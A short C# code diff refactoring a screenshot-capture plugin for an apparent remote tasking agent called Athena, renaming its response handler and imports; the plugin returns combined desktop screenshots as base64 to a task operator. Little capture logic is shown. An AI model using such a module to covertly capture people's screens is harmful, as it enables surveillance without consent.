@@ -1,9 +1,10 @@
-﻿using Athena.Plugins;
+﻿using Athena.Commands.Models;
 using System.Drawing;
 using System.Runtime.InteropServices;
 using Athena.Models;
 using System.IO.Compression;
 using System.IO;
+using Athena.Commands;
 
 //Nuget - System.drawing.common 
 //Only works on windows
@@ -65,7 +66,7 @@ namespace Plugins
                     //combinedBitmap.Save("combined_screenshots.png");
 
                     //Base Code
-                    PluginHandler.AddResponse(new ResponseResult
+                    TaskResponseHandler.AddResponse(new ResponseResult
                     {
                         completed = true,
                         user_output = combinedBitmapBase64,
@@ -76,7 +77,7 @@ namespace Plugins
             }
             catch (Exception e)
             {
-                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
+                TaskResponseHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
                 return;
             }
         }
